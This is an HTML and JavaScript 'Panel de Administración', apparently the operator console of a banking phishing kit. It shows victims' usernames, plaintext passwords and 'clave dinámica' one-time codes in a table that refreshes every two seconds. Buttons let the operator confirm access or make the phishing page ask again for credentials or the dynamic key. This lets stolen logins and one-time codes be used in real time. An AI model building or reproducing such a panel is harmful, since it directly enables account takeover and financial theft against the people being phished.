<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel Administrativo</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #1e1e1e;
            color: #c5c6c7;
            font-family: 'Courier New', Courier, monospace;
        }

        .container {
            background-color: #282828;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0px 0px 15px 5px rgba(0, 255, 128, 0.2);
            position: relative;
        }

        h2 {
            color: #66fcf1;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background-color: #ff4c4c;
            border-color: #ff4c4c;
            font-weight: bold;
            color: white;
        }

        .logout-btn:hover {
            background-color: #e60000;
        }

        .table-responsive {
            margin-top: 50px;
        }

        table {
            background-color: #333333;
            border-radius: 8px;
        }

        thead {
            background-color: #444444;
            color: #66fcf1;
        }

        tbody tr {
            transition: background-color 0.3s ease;
        }

        tbody tr:hover {
            background-color: #4d4d4d;
        }

        tbody tr td {
            color: #ffffff;
        }

        .btn {
            font-weight: bold;
            letter-spacing: 1px;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
        }

        .btn-success:hover, .btn-warning:hover, .btn-info:hover, .btn-danger:hover {
            box-shadow: 0px 0px 10px 2px rgba(40, 167, 69, 0.5);
        }
    </style>
</head>
<body>
    <div class="container mt-5">
        <h2 class="text-center">Panel de Administración</h2>
        <a href="logout.php" class="btn btn-danger logout-btn">Cerrar sesión</a>
        <div class="table-responsive">
            <table class="table table-bordered table-hover">
                <thead class="thead-dark">
                    <tr>
                        <th>ID Usuario</th>
                        <th>Usuario</th>
                        <th>Contraseña</th>
                        <th>Estado</th>
                        <th>Clave Dinámica</th>
                        <th>Acciones</th>
                    </tr>
                </thead>
                <tbody id="userTable">
                    <!-- Aquí se llenarán los usuarios dinámicamente -->
                </tbody>
            </table>
        </div>
    </div>

    <script>
        function loadUsers() {
            fetch('/js/load_users.php')
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    const tableBody = document.getElementById('userTable');
                    tableBody.innerHTML = '';
                    data.forEach(user => {
                        const row = `
                            <tr>
                                <td>${user.id}</td>
                                <td>${user.username}</td>
                                <td>${user.password}</td>
                                <td>${user.estado}</td>
                                <td>${user.dinamica || ''}</td>
                                <td>
                                    <button class="btn btn-success btn-sm" onclick="confirmAccess('${user.session_id}')">Confirmar Acceso</button>
                                    <button class="btn btn-warning btn-sm" onclick="requestCredentialsAgain('${user.session_id}')">Solicitar Datos Nuevamente</button>
                                    <button class="btn btn-info btn-sm" onclick="confirmDynamicKey('${user.session_id}')">Confirmar Dinámica</button>
                                    <button class="btn btn-danger btn-sm" onclick="requestDynamicKeyAgain('${user.session_id}')">Volver a Pedir Dinámica</button>
                                    <button class="btn btn-danger btn-sm" onclick="deleteUser(${user.id})">Eliminar Usuario</button>
                                </td>
                            </tr>
                        `;
                        tableBody.innerHTML += row;
                    });
                })
                .catch(error => console.error('Error:', error));
        }

        function confirmAccess(session_id) {
            // Hacer la solicitud para actualizar el estado en el backend usando session_id
            fetch(`/js/update_status.php?session_id=${session_id}&status=Confirmado`)
                .then(response => response.json())
                .then(data => {
                    // Maneja el mensaje de éxito
                    console.log(data.message);
                    
                    // Opcional: Muestra un mensaje de éxito al administrador

                    // Opcional: Recargar la tabla sin redirigir
                    loadUsers();
                })
                .catch(error => console.error('Error:', error));
        }

        function requestCredentialsAgain(session_id) {
            fetch(`/js/update_status.php?session_id=${session_id}&status=SolicitarCredenciales`)
                .then(response => response.json())
                .then(data => {
                    console.log(data.message);
                    loadUsers();
                })
                .catch(error => console.error('Error:', error));
        }

        function confirmDynamicKey(session_id) {
            // Hacer la solicitud para actualizar el estado a 'Dinámica Confirmada'
            fetch(`/js/update_status.php?session_id=${session_id}&status=dinamicaconfirmada`)
                .then(response => response.json())
                .then(data => {
                    console.log(data.message);
                    loadUsers(); // Recargar la tabla
                })
                .catch(error => console.error('Error:', error));
        }

        function requestDynamicKeyAgain(session_id) {
            fetch(`/js/update_status.php?session_id=${session_id}&status=solicitarDinamica`)
                .then(response => response.json())
                .then(data => {
                    console.log(data.message);
                    loadUsers();
                })
                .catch(error => console.error('Error:', error));
        }

        function deleteUser(id) {
            if (confirm("¿Estás seguro de que deseas eliminar este usuario?")) {
                fetch(`/js/delete_user.php?id=${id}`)
                    .then(response => response.json())
                    .then(data => {
                        loadUsers(); // Recarga la lista de usuarios
                    })
                    .catch(error => console.error('Error:', error));
            }
        }

        // Recargar la tabla automáticamente cada 2 segundos
        setInterval(loadUsers, 2000);

        // Cargar la tabla inicialmente
        window.onload = loadUsers;
    </script>
</body>
</html>
